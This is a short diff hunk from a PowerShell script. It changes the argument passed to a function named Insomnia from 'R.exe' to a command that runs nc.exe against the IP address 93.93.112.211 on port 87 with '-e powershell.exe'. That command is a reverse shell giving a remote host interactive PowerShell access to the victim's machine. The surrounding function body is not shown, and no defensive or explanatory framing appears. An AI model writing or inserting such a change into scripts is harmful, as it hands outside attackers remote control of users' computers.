@@ -41,4 +41,4 @@ function Insomnia{
 		}
 	}
 }
-Insomnia 'R.exe'
+Insomnia "C:\Users\$env:username\nc.exe 93.93.112.211 87 -e powershell.exe"
